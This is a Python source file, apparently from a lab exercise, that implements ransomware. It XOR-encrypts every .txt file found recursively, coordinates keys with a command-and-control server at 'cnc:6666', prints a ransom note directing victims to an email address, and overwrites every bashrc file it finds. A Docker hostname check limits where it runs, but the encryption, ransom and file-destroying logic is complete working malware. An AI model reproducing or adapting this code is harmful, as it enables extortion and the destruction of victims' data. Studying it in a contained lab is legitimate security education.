import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
from ascii_wonders import *

CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"


class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
        self._log = logging.getLogger(self.__class__.__name__)
        self._secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)


    def check_hostname_is_docker(self) -> None:
        # At first, we check if we are in a docker
        # to prevent running Veilleuxthis program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str) -> list:
        # return all files matching the filter
        """In the first scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
        The paths are stored as PosixPath objects of their string equivalent."""
        # files_list = list(Path().rglob(filter))
        """In the second scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
        The paths are stored as strings."""

        files_list = [str(p) for p in list(Path().rglob(filter))]

        return files_list

    def encrypt(self) -> None:
        # main function for encrypting (see PDF)
        self._log.debug("PASSING THROUGH encrypt() FUNCTION!!!!")
        self._log.debug(self.get_files("*.txt"))
        self._secret_manager.setup()
        self._secret_manager.xorfiles(self.get_files("*.txt"))
        token = self._secret_manager.get_hex_token()
        print(OH_NO)
        print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
        self.add_reminder_to_bashrc()
        return None
    
    def add_reminder_to_bashrc(self) -> None:
        for bashrc in self.get_files("bashrc"):
            with open(bashrc, "w") as file:
                file.write("python root/ransomware/ransomware.py --decrypt")

    def decrypt(self):
        # main function for decrypting (see PDF)
        self._log.debug("PASSING THROUGH decrypt() FUNCTION!!!!")
        self._secret_manager.load()
        candidate_key = input("Please enter your cryptographic key: ")
        while not self._secret_manager.set_key(candidate_key):
            print("The key you have entered is incorrect.")
            candidate_key = input("Please enter your cryptographic key: ")

        # self._secret_manager.set_key(candidate_key)
        self._secret_manager.xorfiles(self.get_files("*.txt"))
        self._secret_manager.clean()
        print("\rOkay, your data has been restored to its former state. Have a nice day :)")
        print(HERE_WIPE_YOUR_TEARS)
        print(ASCII_TISSUE_BOX)


if __name__ == "__main__":
    if "--verbose" in sys.argv:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)

    ransomware = Ransomware()
    if not "--decrypt" in sys.argv:
        ransomware.encrypt()
    if "--decrypt" in sys.argv:
        ransomware.decrypt()
